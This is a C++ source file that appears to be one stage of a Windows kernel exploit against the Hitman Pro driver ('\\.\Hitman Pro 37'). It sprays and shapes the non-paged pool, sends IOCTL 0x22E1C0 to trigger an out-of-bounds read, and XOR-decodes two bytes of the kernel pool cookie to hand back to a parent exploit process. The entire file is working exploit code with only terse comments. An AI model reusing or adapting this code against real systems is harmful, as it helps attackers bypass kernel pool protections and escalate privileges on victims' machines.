#include <Windows.h>
#include <stdio.h>
#include <SubAuth.h>
#include <iostream>
#include <time.h>
#include <tchar.h>
#include <psapi.h>
#include "..\..\PoolSprayerLib\PoolSprayerLib\PoolSprayer.h"

#define LEN_PATH_TO_REACH 65

PVOID	pPoolCookie = NULL;


int main(int argc, char **argv)
{
	HANDLE		hDevice = INVALID_HANDLE_VALUE;
	wchar_t		*Outbuff;
	unsigned int		offset = LEN_PATH_TO_REACH * 2 + 4 + 2; // Path * 2 (UNICODE) + 4 (DWORD before string) + 2 (null byte)
	DWORD64				cookie = 0;
	DWORD				currentProcessId = 0;
	DWORD				pieceOfCookie = 0;
	DWORD				pieceOfAddress = 0;
	int					byteOffset;
	NonPagedPoolSprayer	*pPoolSprayer;
	HOLE				Hole;
	UINT				nPreviousHandleIndex;
	PVOID				pLeakingChunk = NULL;

	currentProcessId = GetCurrentProcessId();

	//We use the argument to know which part of the cookie we want to leak.
	if (argc != 2)
	{
		printf("Usage: ./LeakPoolCookie <index(0-3)>");
		return (0);
	}
	else
	{
		byteOffset = atoi(argv[1]);
		if (byteOffset < 0 || byteOffset > 3)
		{
			printf("Usage: ./LeakPoolCookie <index(0-3)>");
			return (0);
		}
		byteOffset *= 2;
	}
	offset += byteOffset;
	offset /= 2;

	hDevice = CreateFile(L"\\\\.\\Hitman Pro 37", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	while (hDevice == INVALID_HANDLE_VALUE)
	{
		hDevice = CreateFile(L"\\\\.\\Hitman Pro 37", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		Sleep(1000);
	}

	Outbuff = (wchar_t *)malloc(0x400 * sizeof(wchar_t));

	memset(Outbuff, 0, sizeof(Outbuff));

	
	try
	{
		// Spraying the pool
		pPoolSprayer = new NonPagedPoolSprayer();
		pPoolSprayer->sprayPool();

		// Create a hole of 3 chunks
		Hole = pPoolSprayer->planHole(3);

		nPreviousHandleIndex = Hole.nBaseIndexInOriginalSpray + 1;
		pLeakingChunk = Hole.pBaseAddress;
		

		pPoolSprayer->createHole(Hole);
		
		// We allocate a buffer in the hole we created
		DeviceIoControl(hDevice, 0x22E1C0, &currentProcessId, 0x4, Outbuff, 0x1f0, NULL, NULL);
		
		// the we close the chunk just before our hole and make the chunks coaelesce
		closeBunchOfHandles(pPoolSprayer->getObjectTable(), pPoolSprayer->getMaxObjects() / 10, pPoolSprayer->getMaxObjects() / 2, 255, TRUE);
		if (pPoolSprayer->getObjectTable()[nPreviousHandleIndex] == INVALID_HANDLE_VALUE || !CloseHandle(pPoolSprayer->getObjectTable()[nPreviousHandleIndex]))
		{
			return 0;
		}
		else
			pPoolSprayer->getObjectTable()[nPreviousHandleIndex] = INVALID_HANDLE_VALUE;
		closeBunchOfHandles(pPoolSprayer->getObjectTable(), pPoolSprayer->getMaxObjects() / 10, pPoolSprayer->getMaxObjects() / 2, 100, TRUE);
		
		// and finally reallocate a buffer in the new free chunk (which has the size of 4 objects)
		// We trigger the OOB read a write just enough to leak 2 bytes of the PoolCookie
		DeviceIoControl(hDevice, 0x22E1C0, &currentProcessId, 0x4, Outbuff, 0x290, NULL, NULL);


		pieceOfCookie = Outbuff[offset + 1] * 0x100;
		pieceOfCookie += Outbuff[offset];
		if (pieceOfCookie != 0x0000)
		{
			// the piece we just leaked is encoded with the address of the chunk..
			// So we need to decode it before sending it back to the main process
			pieceOfAddress = (((DWORD64)pLeakingChunk >> (byteOffset * 8)) & 0xFFFF);
			
			pieceOfCookie = pieceOfCookie ^ pieceOfAddress;
		}
		else
		{
			// if we failed, we return 0 and the main process will try again.
			return 0;
		}

		pPoolSprayer->freePool();
		free(pPoolSprayer);
	}
	catch (PoolSprayerException &e)
	{
		printf("[-]Error occured !\n %s\n", e.getMessage());
		return 0;
	}

	CloseHandle(hDevice);
	free(Outbuff);
	return (pieceOfCookie);
}